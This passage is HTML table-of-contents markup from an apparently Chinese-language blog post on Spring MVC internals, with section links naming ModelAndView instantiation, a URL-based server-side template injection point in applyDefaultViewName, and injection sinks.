toc-level-3"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B%E5%8C%96ModeAndView"><span class="toc-text">实例化ModeAndView</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#applyDefaultViewName-URL-SSTI"><span class="toc-text">applyDefaultViewName URL SSTI</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#processDispatchResult%EF%BC%9ASSTI-sink"><span class="toc-text">processDispatchResult：SSTI sink</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sink-2"><span class="toc-text">sink 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol> -->
         <div class="toc"></div>
       </div>
     </div>
